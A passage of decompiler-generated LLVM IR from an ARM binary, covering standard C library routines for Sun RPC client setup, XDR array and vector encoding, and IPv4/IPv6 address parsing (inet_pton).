  store i32 400, i32* @r5, align 4
  br i1 %v2_1a80c, label %dec_label_pc_1a8d0, label %dec_label_pc_1a828

dec_label_pc_1a828:                               ; preds = %entry
  store i32 0, i32* @lr, align 4
  %v2_1a82c = ptrtoint i32* %stack_var_-32 to i32
  %v9_1a844 = call i32 @__GI_clntudp_bufcreate(i32* nonnull %stack_var_-52, i32 100000, i32 2, i32 5, i32 0, i32 %v2_1a82c, i32 400, i32 400)
  store i32 %v9_1a844, i32* @r5, align 4
  %v2_1a848 = icmp eq i32 %v9_1a844, 0
  br i1 %v2_1a848, label %dec_label_pc_1a8d0, label %dec_label_pc_1a85c

dec_label_pc_1a85c:                               ; preds = %dec_label_pc_1a828
  %v1_1a870 = add i32 %v9_1a844, 4
  %v2_1a870 = inttoptr i32 %v1_1a870 to i32*
  %v3_1a870 = load i32, i32* %v2_1a870, align 4
  store i32 %v3_1a870, i32* @r4, align 4
  store i32 60, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 108696, i32* @lr, align 4
  %v1_1a894 = inttoptr i32 %v3_1a870 to i32*
  %v2_1a894 = load i32, i32* %v1_1a894, align 4
  call void @__pseudo_branch(i32 %v2_1a894)
  store i32 ptrtoint ([24 x i8]* @global_var_1de74.1025 to i32), i32* @r1, align 4
  %v0_1a8a0 = load i32, i32* @r5, align 4
  store i32 %v0_1a8a0, i32* @r0, align 4
  %v3_1a8a8 = call i32 @clnt_perror(i32 %v0_1a8a0, i32 ptrtoint ([24 x i8]* @global_var_1de74.1025 to i32))
  %v0_1a8b4 = load i32, i32* @r5, align 4
  %v1_1a8b8 = add i32 %v0_1a8b4, 4
  %v2_1a8b8 = inttoptr i32 %v1_1a8b8 to i32*
  %v3_1a8b8 = load i32, i32* %v2_1a8b8, align 4
  %v1_1a8c0 = add i32 %v3_1a8b8, 16
  %v2_1a8c0 = inttoptr i32 %v1_1a8c0 to i32*
  %v3_1a8c0 = load i32, i32* %v2_1a8c0, align 4
  call void @__pseudo_branch(i32 %v3_1a8c0)
  br label %dec_label_pc_1a8d0

dec_label_pc_1a8d0:                               ; preds = %entry, %dec_label_pc_1a828, %dec_label_pc_1a85c
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 60, { 0, 10, 11, 3, 12, 6, 7, 8, 4, 5, 9, 13, 1, 2 }
  uselistorder i32 (i32*, i32, i32, i32, i32, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32 400, { 1, 0, 7, 3, 2, 10, 4, 9, 5, 6, 8 }
  uselistorder label %dec_label_pc_1a8d0, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1a8f0 = load i32, i32* @r4, align 4
  store i32 %v3_1a8f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2f52c.1028 to i32), i32* @r4, align 4
  %v2_1a8f8 = load i32, i32* @global_var_2f52c.1028, align 4
  %v2_1a8fc = icmp eq i32 %v2_1a8f8, 0
  br i1 %v2_1a8fc, label %dec_label_pc_1a904, label %dec_label_pc_1a90c

dec_label_pc_1a904:                               ; preds = %entry
  %v0_1a904 = call i32 @getdtablesize()
  %v1_1a908 = load i32, i32* @r4, align 4
  %v2_1a908 = inttoptr i32 %v1_1a908 to i32*
  store i32 %v0_1a904, i32* %v2_1a908, align 4
  %v2_1a90c.pre = load i32, i32* @global_var_2f52c.1028, align 4
  %v2_1a910.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a90c

dec_label_pc_1a90c:                               ; preds = %entry, %dec_label_pc_1a904
  %v2_1a910 = phi i32 [ %v3_1a8f0, %entry ], [ %v2_1a910.pre, %dec_label_pc_1a904 ]
  %v2_1a90c = phi i32 [ %v2_1a8f8, %entry ], [ %v2_1a90c.pre, %dec_label_pc_1a904 ]
  store i32 %v2_1a910, i32* @r4, align 4
  ret i32 %v2_1a90c

; uselistorder directives
  uselistorder label %dec_label_pc_1a90c, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1a918 = load i32, i32* @r4, align 4
  store i32 %v3_1a918, i32* %stack_var_-28, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %bb13

dec_label_pc_1a938:                               ; preds = %bb13
  %v1_1a93c = call i32 @unknown_0()
  %v2_1a940 = icmp eq i32 %v1_1a93c, 0
  br i1 %v2_1a940, label %bb, label %dec_label_pc_1a938._crit_edge

dec_label_pc_1a938._crit_edge:                    ; preds = %dec_label_pc_1a938
  %v0_1a948.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1a948.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1a94c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a958.pre = load i32, i32* %r6.global-to-local, align 4
  br label %bb13

bb:                                               ; preds = %dec_label_pc_1a938
  %v3_1a944 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_1a944, i32* %r4.global-to-local, align 4
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_1a938._crit_edge, %entry
  %v1_1a958 = phi i32 [ %v1_1a958.pre, %dec_label_pc_1a938._crit_edge ], [ %arg4, %entry ]
  %v0_1a94c = phi i32 [ %v0_1a94c.pre, %dec_label_pc_1a938._crit_edge ], [ %arg2, %entry ]
  %v1_1a948 = phi i32 [ %v1_1a948.pre, %dec_label_pc_1a938._crit_edge ], [ %arg3, %entry ]
  %v0_1a95c = phi i32 [ %v0_1a948.pre, %dec_label_pc_1a938._crit_edge ], [ 0, %entry ]
  %v3_1a948 = icmp ult i32 %v0_1a95c, %v1_1a948
  %v2_1a958 = add i32 %v0_1a94c, %v1_1a958
  store i32 %v2_1a958, i32* %r4.global-to-local, align 4
  %v1_1a95c = add i32 %v0_1a95c, 1
  store i32 %v1_1a95c, i32* %r5.global-to-local, align 4
  br i1 %v3_1a948, label %dec_label_pc_1a938, label %dec_label_pc_1a964

dec_label_pc_1a964:                               ; preds = %bb13
  %v2_1a968 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1a968, i32* %r4.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 ()* @unknown_0, { 4, 3, 1, 2, 5, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v9_1a96c = load i32, i32* @r6, align 4
  %v12_1a96c = load i32, i32* @r7, align 4
  %v15_1a96c = load i32, i32* @r8, align 4
  %v21_1a96c = load i32, i32* @sl, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg5, i32* %fp.global-to-local, align 4
  %v1_1a988 = inttoptr i32 %arg2 to i32*
  %v2_1a988 = load i32, i32* %v1_1a988, align 4
  store i32 %v2_1a988, i32* @r4, align 4
  %v2_1a98c = inttoptr i32 %arg3 to i32*
  %v4_1a98c = call i32 @xdr_u_int(i32* %v2_1a98c, i32* %v2_1a98c)
  store i32 %v4_1a98c, i32* %r0.global-to-local, align 4
  %v2_1a990 = icmp eq i32 %v4_1a98c, 0
  br i1 %v2_1a990, label %dec_label_pc_1aa8c, label %dec_label_pc_1a998

dec_label_pc_1a998:                               ; preds = %entry
  %v0_1a998 = load i32, i32* @r5, align 4
  %v1_1a998 = inttoptr i32 %v0_1a998 to i32*
  %v2_1a998 = load i32, i32* %v1_1a998, align 4
  store i32 %v2_1a998, i32* @r7, align 4
  %v1_1a99c = load i32, i32* @r6, align 4
  %tmp21 = icmp ugt i32 %v2_1a998, %v1_1a99c
  br i1 %tmp21, label %dec_label_pc_1a9b8, label %dec_label_pc_1a9a4

dec_label_pc_1a9a4:                               ; preds = %dec_label_pc_1a998
  %v0_1a9a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a9ac = udiv i32 -1, %v0_1a9a8
  store i32 %v2_1a9ac, i32* %r0.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v2_1a998, %v2_1a9ac
  br i1 %tmp22, label %dec_label_pc_1a9b8, label %dec_label_pc_1a9c4

dec_label_pc_1a9b8:                               ; preds = %dec_label_pc_1a9a4, %dec_label_pc_1a998
  %v0_1a9b8 = load i32, i32* @sl, align 4
  %v1_1a9b8 = inttoptr i32 %v0_1a9b8 to i32*
  %v2_1a9b8 = load i32, i32* %v1_1a9b8, align 4
  %v7_1a9bc = icmp eq i32 %v2_1a9b8, 2
  br i1 %v7_1a9bc, label %dec_label_pc_1a9c4, label %dec_label_pc_1aa8c

dec_label_pc_1a9c4:                               ; preds = %dec_label_pc_1a9a4, %dec_label_pc_1a9b8
  %v0_1a9c4 = load i32, i32* @r4, align 4
  %v2_1a9c4 = icmp eq i32 %v0_1a9c4, 0
  br i1 %v2_1a9c4, label %dec_label_pc_1a9cc, label %dec_label_pc_1aa2c

dec_label_pc_1a9cc:                               ; preds = %dec_label_pc_1a9c4
  %v0_1a9cc = load i32, i32* @sl, align 4
  %v1_1a9cc = inttoptr i32 %v0_1a9cc to i32*
  %v2_1a9cc = load i32, i32* %v1_1a9cc, align 4
  %v7_1a9d0 = icmp eq i32 %v2_1a9cc, 1
  br i1 %v7_1a9d0, label %dec_label_pc_1a9e4, label %dec_label_pc_1a9d8

dec_label_pc_1a9d8:                               ; preds = %dec_label_pc_1a9cc
  %v7_1a9d8 = icmp eq i32 %v2_1a9cc, 2
  br i1 %v7_1a9d8, label %dec_label_pc_1aa94, label %dec_label_pc_1aa2c

dec_label_pc_1a9e4:                               ; preds = %dec_label_pc_1a9cc
  %v2_1a9e4 = icmp eq i32 %v2_1a998, 0
  br i1 %v2_1a9e4, label %dec_label_pc_1aa94, label %dec_label_pc_1a9ec

dec_label_pc_1a9ec:                               ; preds = %dec_label_pc_1a9e4
  %v0_1a9ec = load i32, i32* %fp.global-to-local, align 4
  %v2_1a9ec = mul i32 %v0_1a9ec, %v2_1a998
  store i32 %v2_1a9ec, i32* @r5, align 4
  store i32 %v2_1a9ec, i32* %r0.global-to-local, align 4
  %v1_1a9f4 = call i32 @malloc(i32 %v2_1a9ec)
  store i32 %v1_1a9f4, i32* @r0, align 4
  %v2_1a9f8 = icmp eq i32 %v1_1a9f4, 0
  store i32 %v1_1a9f4, i32* @r4, align 4
  %v1_1aa00 = load i32, i32* %sb.global-to-local, align 4
  %v2_1aa00 = inttoptr i32 %v1_1aa00 to i32*
  store i32 %v1_1a9f4, i32* %v2_1aa00, align 4
  br i1 %v2_1a9f8, label %dec_label_pc_1aa08, label %dec_label_pc_1aa20

dec_label_pc_1aa08:                               ; preds = %dec_label_pc_1a9ec
  store i32 ptrtoint ([26 x i8]* @global_var_1de9c.1031 to i32), i32* %r0.global-to-local, align 4
  %v2_1aa10 = load i32, i32* @global_var_2a890, align 4
  %v3_1aa14 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1de9c.1031 to i32), i32 %v2_1aa10)
  store i32 %v3_1aa14, i32* %r0.global-to-local, align 4
  %v0_1aa18 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aa98

dec_label_pc_1aa20:                               ; preds = %dec_label_pc_1a9ec
  %v0_1aa20 = load i32, i32* @r5, align 4
  store i32 %v0_1aa20, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_1aa28 = call i32 @__GI_memset()
  store i32 %v0_1aa28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aa2c

dec_label_pc_1aa2c:                               ; preds = %dec_label_pc_1a9d8, %dec_label_pc_1a9c4, %dec_label_pc_1aa20
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aa48

dec_label_pc_1aa38:                               ; preds = %bb20
  %v0_1aa68 = load i32, i32* %r6.global-to-local, align 4
  %v1_1aa68 = add i32 %v0_1aa68, 1
  store i32 %v1_1aa68, i32* %r6.global-to-local, align 4
  store i32 109124, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg6)
  %v0_1aa44 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aa48

dec_label_pc_1aa48:                               ; preds = %dec_label_pc_1aa2c, %dec_label_pc_1aa38
  %storemerge = phi i32 [ 1, %dec_label_pc_1aa2c ], [ %v0_1aa44, %dec_label_pc_1aa38 ]
  store i32 %storemerge, i32* @r5, align 4
  %v2_1aa48 = icmp eq i32 %storemerge, 0
  br i1 %v2_1aa48, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_1aa48
  %v1_1aa4c = load i32, i32* %r6.global-to-local, align 4
  %v2_1aa4c = load i32, i32* @r7, align 4
  %v4_1aa4c = icmp uge i32 %v1_1aa4c, %v2_1aa4c
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1aa48, %bb
  %v0_1aa64.pr = phi i1 [ true, %dec_label_pc_1aa48 ], [ %v4_1aa4c, %bb ]
  %v0_1aa50 = load i32, i32* @r4, align 4
  %v0_1aa54 = load i32, i32* @sl, align 4
  store i32 %v0_1aa54, i32* %r0.global-to-local, align 4
  %v1_1aa5c = load i32, i32* %fp.global-to-local, align 4
  %v2_1aa5c = add i32 %v1_1aa5c, %v0_1aa50
  store i32 %v2_1aa5c, i32* @r4, align 4
  br i1 %v0_1aa64.pr, label %dec_label_pc_1aa70, label %dec_label_pc_1aa38

dec_label_pc_1aa70:                               ; preds = %bb20
  store i32 0, i32* @r8, align 4
  %v0_1aa682 = load i32, i32* %r6.global-to-local, align 4
  %v1_1aa683 = add i32 %v0_1aa682, 1
  store i32 %v1_1aa683, i32* @r6, align 4
  %v1_1aa70 = inttoptr i32 %v0_1aa54 to i32*
  %v2_1aa70 = load i32, i32* %v1_1aa70, align 4
  %v7_1aa74 = icmp eq i32 %v2_1aa70, 2
  br i1 %v7_1aa74, label %dec_label_pc_1aa7c, label %dec_label_pc_1aa98

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aa70
  %v0_1aa7c = load i32, i32* %sb.global-to-local, align 4
  %v1_1aa7c = inttoptr i32 %v0_1aa7c to i32*
  %v2_1aa7c = load i32, i32* %v1_1aa7c, align 4
  store i32 %v2_1aa7c, i32* @r0, align 4
  %v0_1aa80 = call i32 @free()
  store i32 %v0_1aa80, i32* %r0.global-to-local, align 4
  %v0_1aa84 = load i32, i32* @r8, align 4
  %v1_1aa84 = load i32, i32* %sb.global-to-local, align 4
  %v2_1aa84 = inttoptr i32 %v1_1aa84 to i32*
  store i32 %v0_1aa84, i32* %v2_1aa84, align 4
  %v0_1aa98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1aa98

dec_label_pc_1aa8c:                               ; preds = %dec_label_pc_1a9b8, %entry
  br label %dec_label_pc_1aa98

dec_label_pc_1aa94:                               ; preds = %dec_label_pc_1a9d8, %dec_label_pc_1a9e4
  br label %dec_label_pc_1aa98

dec_label_pc_1aa98:                               ; preds = %dec_label_pc_1aa70, %dec_label_pc_1aa8c, %dec_label_pc_1aa7c, %dec_label_pc_1aa08, %dec_label_pc_1aa94
  %v0_1aa98 = phi i32 [ %storemerge, %dec_label_pc_1aa70 ], [ 0, %dec_label_pc_1aa8c ], [ %v0_1aa98.pre, %dec_label_pc_1aa7c ], [ %v0_1aa18, %dec_label_pc_1aa08 ], [ 1, %dec_label_pc_1aa94 ]
  store i32 %v0_1aa98, i32* %r0.global-to-local, align 4
  store i32 %v9_1a96c, i32* @r6, align 4
  store i32 %v12_1a96c, i32* @r7, align 4
  store i32 %v15_1a96c, i32* @r8, align 4
  store i32 %v21_1a96c, i32* @sl, align 4
  ret i32 %v0_1aa98

; uselistorder directives
  uselistorder i32 %v0_1aa98, { 1, 0 }
  uselistorder i32 %v1_1a9f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a998, { 2, 3, 0, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 3, 2, 5, 7, 6, 8, 0, 9 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1aa98, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1aa94, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1aa48, { 1, 0 }
  uselistorder label %dec_label_pc_1aa2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a9c4, { 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_1aaa8 = load i32, i32* @r5, align 4
  %v2_1aab0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_1aab0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_1ab383 = load i8, i8* %arg1, align 1
  %v3_1ab384 = zext i8 %v2_1ab383 to i32
  %v5_1ab385 = add i32 %tmp, 1
  store i32 %v5_1ab385, i32* @r4, align 4
  %v2_1ab3c6 = icmp eq i8 %v2_1ab383, 0
  store i1 %v2_1ab3c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab3c6, label %dec_label_pc_1ab48, label %dec_label_pc_1aad0

dec_label_pc_1aad0:                               ; preds = %entry, %dec_label_pc_1ab38.backedge
  %v0_1ab14 = phi i32 [ %v3_1ab38, %dec_label_pc_1ab38.backedge ], [ %v3_1ab384, %entry ]
  %v1_1ab4010.in = phi i32 [ %v3_1ab38, %dec_label_pc_1ab38.backedge ], [ %v3_1ab384, %entry ]
  %v1_1ab4010 = add nsw i32 %v1_1ab4010.in, -48
  %v2_1aad0 = icmp ugt i32 %v1_1ab4010, 8
  %v7_1aad0 = icmp eq i32 %v1_1ab4010, 9
  store i1 %v7_1aad0, i1* %cpsr_z.global-to-local, align 1
  %v2_1aad8 = xor i1 %v7_1aad0, true
  %v3_1aad8 = and i1 %v2_1aad0, %v2_1aad8
  br i1 %v3_1aad8, label %dec_label_pc_1ab14, label %dec_label_pc_1aadc

dec_label_pc_1aadc:                               ; preds = %dec_label_pc_1aad0
  %v0_1aadc = load i32, i32* %r0.global-to-local, align 4
  %v1_1aadc = inttoptr i32 %v0_1aadc to i8*
  %v2_1aadc = load i8, i8* %v1_1aadc, align 1
  %v3_1aadc = zext i8 %v2_1aadc to i32
  %v3_1aae4 = mul nuw nsw i32 %v3_1aadc, 10
  %v4_1aae4 = add nuw nsw i32 %v3_1aae4, %v0_1ab14
  %v1_1aae8 = add nsw i32 %v4_1aae4, -48
  %v2_1aaec = icmp ugt i32 %v1_1aae8, 254
  %v7_1aaec = icmp eq i32 %v1_1aae8, 255
  store i1 %v7_1aaec, i1* %cpsr_z.global-to-local, align 1
  %v2_1aaf0 = xor i1 %v7_1aaec, true
  %v3_1aaf0 = and i1 %v2_1aaec, %v2_1aaf0
  br i1 %v3_1aaf0, label %dec_label_pc_1ab6c, label %dec_label_pc_1aaf4

dec_label_pc_1aaf4:                               ; preds = %dec_label_pc_1aadc
  %v0_1aaf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1aaf4 = icmp eq i32 %v0_1aaf4, 0
  store i1 %v2_1aaf4, i1* %cpsr_z.global-to-local, align 1
  %v1_1aaf8 = trunc i32 %v1_1aae8 to i8
  store i8 %v1_1aaf8, i8* %v1_1aadc, align 1
  %v0_1aafc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aafc, label %dec_label_pc_1ab00, label %dec_label_pc_1ab38.backedge

dec_label_pc_1ab00:                               ; preds = %dec_label_pc_1aaf4
  %v0_1ab00 = load i32, i32* @lr, align 4
  %v1_1ab00 = add i32 %v0_1ab00, 1
  store i32 %v1_1ab00, i32* @lr, align 4
  %v7_1ab04 = icmp eq i32 %v1_1ab00, 4
  store i1 %v7_1ab04, i1* %cpsr_z.global-to-local, align 1
  %v0_1ab08 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ab08 = add i32 %v0_1ab08, 1
  store i32 %v1_1ab08, i32* %r1.global-to-local, align 4
  %v8_1ab0c = icmp sgt i32 %v1_1ab00, 4
  br i1 %v8_1ab0c, label %dec_label_pc_1ab6c, label %dec_label_pc_1ab38.backedge

dec_label_pc_1ab14:                               ; preds = %dec_label_pc_1aad0
  %v7_1ab14 = icmp eq i32 %v0_1ab14, 46
  store i1 %v7_1ab14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ab14, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1ab14
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab6c

bb:                                               ; preds = %dec_label_pc_1ab14
  %v1_1ab1c = load i32, i32* %r1.global-to-local, align 4
  %v2_1ab1c = urem i32 %v1_1ab1c, 2
  %v2_1ab20 = icmp eq i32 %v2_1ab1c, 0
  store i1 %v2_1ab20, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_1ab20, label %dec_label_pc_1ab6c, label %dec_label_pc_1ab2c

dec_label_pc_1ab2c:                               ; preds = %bb
  %v0_1ab2c = load i32, i32* @lr, align 4
  %v7_1ab2c = icmp eq i32 %v0_1ab2c, 4
  store i1 %v7_1ab2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ab2c, label %dec_label_pc_1ab6c, label %dec_label_pc_1ab34

dec_label_pc_1ab34:                               ; preds = %dec_label_pc_1ab2c
  %v2_1ab34 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ab34 = add i32 %v2_1ab34, 1
  %v4_1ab34 = inttoptr i32 %v3_1ab34 to i8*
  store i8 0, i8* %v4_1ab34, align 1
  %v5_1ab34 = load i32, i32* %r0.global-to-local, align 4
  %v6_1ab34 = add i32 %v5_1ab34, 1
  store i32 %v6_1ab34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ab38.backedge

dec_label_pc_1ab38.backedge:                      ; preds = %dec_label_pc_1ab34, %dec_label_pc_1aaf4, %dec_label_pc_1ab00
  %v0_1ab38 = load i32, i32* @r4, align 4
  %v1_1ab38 = inttoptr i32 %v0_1ab38 to i8*
  %v2_1ab38 = load i8, i8* %v1_1ab38, align 1
  %v3_1ab38 = zext i8 %v2_1ab38 to i32
  %v5_1ab38 = add i32 %v0_1ab38, 1
  store i32 %v5_1ab38, i32* @r4, align 4
  %v2_1ab3c = icmp eq i8 %v2_1ab38, 0
  store i1 %v2_1ab3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab3c, label %dec_label_pc_1ab38.dec_label_pc_1ab48_crit_edge, label %dec_label_pc_1aad0

dec_label_pc_1ab38.dec_label_pc_1ab48_crit_edge:  ; preds = %dec_label_pc_1ab38.backedge
  %v0_1ab48.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1ab48

dec_label_pc_1ab48:                               ; preds = %dec_label_pc_1ab38.dec_label_pc_1ab48_crit_edge, %entry
  %v0_1ab48 = phi i32 [ %v0_1ab48.pre, %dec_label_pc_1ab38.dec_label_pc_1ab48_crit_edge ], [ 0, %entry ]
  %v7_1ab48 = icmp eq i32 %v0_1ab48, 3
  store i1 %v7_1ab48, i1* %cpsr_z.global-to-local, align 1
  %v7_1ab4c = icmp slt i32 %v0_1ab48, 4
  br i1 %v7_1ab4c, label %dec_label_pc_1ab6c, label %dec_label_pc_1ab50

dec_label_pc_1ab50:                               ; preds = %dec_label_pc_1ab48
  %v0_1ab50 = load i32, i32* @r5, align 4
  store i32 %v0_1ab50, i32* @r0, align 4
  store i32 %v2_1aab0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1ab5c = call i32 @memcpy()
  br label %dec_label_pc_1ab6c

dec_label_pc_1ab6c:                               ; preds = %dec_label_pc_1aadc, %dec_label_pc_1ab00, %bb, %dec_label_pc_1ab2c, %.thread12, %dec_label_pc_1ab48, %dec_label_pc_1ab50
  %storemerge = phi i32 [ 1, %dec_label_pc_1ab50 ], [ 0, %dec_label_pc_1ab48 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1ab2c ], [ 0, %bb ], [ 0, %dec_label_pc_1ab00 ], [ 0, %dec_label_pc_1aadc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1aaa8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1ab48, { 1, 0 }
  uselistorder i32 %v3_1ab38, { 1, 0 }
  uselistorder i32 %v0_1ab14, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_1ab6c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_1ab38.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1aad0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1ab74 = load i32, i32* @r4, align 4
  %v6_1ab74 = load i32, i32* @r5, align 4
  %v9_1ab74 = load i32, i32* @r6, align 4
  %v7_1ab78 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_1ab78, label %dec_label_pc_1ab98, label %dec_label_pc_1ab8c

dec_label_pc_1ab8c:                               ; preds = %entry
  %v7_1ab8c = icmp eq i32 %arg1, 10
  br i1 %v7_1ab8c, label %dec_label_pc_1abac, label %dec_label_pc_1ad5c

dec_label_pc_1ab98:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1aba0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_1aba0, i32* %r0.global-to-local, align 4
  store i32 %v4_1aba0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ad74

dec_label_pc_1abac:                               ; preds = %dec_label_pc_1ab8c
  %v2_1abac = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1abac, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1abb8 = call i32 @__GI_memset()
  store i32 %v0_1abb8, i32* %r0.global-to-local, align 4
  %v0_1abbc = load i32, i32* @r6, align 4
  %v1_1abbc = inttoptr i32 %v0_1abbc to i8*
  %v2_1abbc = load i8, i8* %v1_1abbc, align 1
  %v3_1abbc = zext i8 %v2_1abbc to i32
  store i32 %v3_1abbc, i32* %r3.global-to-local, align 4
  %v7_1abc0 = icmp eq i8 %v2_1abbc, 58
  store i32 %v0_1abb8, i32* @r4, align 4
  %v2_1abc8 = add i32 %v0_1abb8, 16
  store i32 %v2_1abc8, i32* %r8.global-to-local, align 4
  br i1 %v7_1abc0, label %dec_label_pc_1abd0, label %dec_label_pc_1abdc

dec_label_pc_1abd0:                               ; preds = %dec_label_pc_1abac
  %v1_1abd0 = add i32 %v0_1abbc, 1
  %v2_1abd0 = inttoptr i32 %v1_1abd0 to i8*
  %v3_1abd0 = load i8, i8* %v2_1abd0, align 1
  %v4_1abd0 = zext i8 %v3_1abd0 to i32
  store i32 %v4_1abd0, i32* %r3.global-to-local, align 4
  store i32 %v1_1abd0, i32* @r6, align 4
  %v7_1abd4 = icmp eq i8 %v3_1abd0, 58
  br i1 %v7_1abd4, label %dec_label_pc_1abdc, label %dec_label_pc_1ad70

